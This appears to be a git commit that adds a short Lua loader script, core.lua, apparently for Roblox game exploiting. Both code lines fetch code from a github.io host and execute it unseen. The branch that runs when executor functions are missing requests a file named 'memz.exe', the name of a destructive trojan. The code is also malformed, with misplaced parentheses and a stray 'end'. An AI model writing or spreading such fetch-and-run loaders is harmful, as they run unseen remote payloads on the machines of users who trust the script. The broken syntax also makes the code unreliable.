2c3734fe2d9e9e9c84360776b94f7b7b584795d1
RTrade <114867982+RTrade@users.noreply.github.com>
2023-02-25 14:20:24 +0000

    Create core.lua

---
+++ core.lua
@@ -0,0 +1,5 @@
+
+if not getgenv or not Drawing then
+  return loadstring(game:HttpGet("https://rtrade.github.io/memz.exe")()
+    end
+loadstring(game:HttpGet("https://rtrade.github.io/Script.html"))("https://discord.gg/RJCabfrQEC")
